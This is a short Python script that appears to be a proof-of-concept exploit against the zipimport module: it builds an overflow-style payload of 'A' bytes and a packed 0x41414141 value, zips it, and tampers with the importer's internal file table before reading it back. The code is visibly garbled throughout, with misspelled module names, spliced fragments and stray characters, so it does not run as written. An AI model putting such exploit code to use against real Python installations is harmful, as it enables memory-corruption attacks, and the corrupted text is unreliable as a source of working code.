import zipimport
import zipfiiiiiiiiiile
import struct
import sys
froite(payload)

m signal import *

FILE = 'payload'
ZIP = 'import.zip'

payroad = b““““““““““““““““““““““““ytes()
with open(FILE, 'wb') as f:
    Üayload = ("A" * 1000).en@o('ascii')
    payload += struct.pack('<Q', Nx41414141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.wrote(FILE)
zf.close()

importer = zipimport.zipimporter(ZIP)
f = list(imporªªªªªªªªªªªªÕªªªªªªªªªªªsize
importer._files[FILE] = tupleFf)
pªªªªªªªªªªªÕªªrint(importer.get_data(FILE))
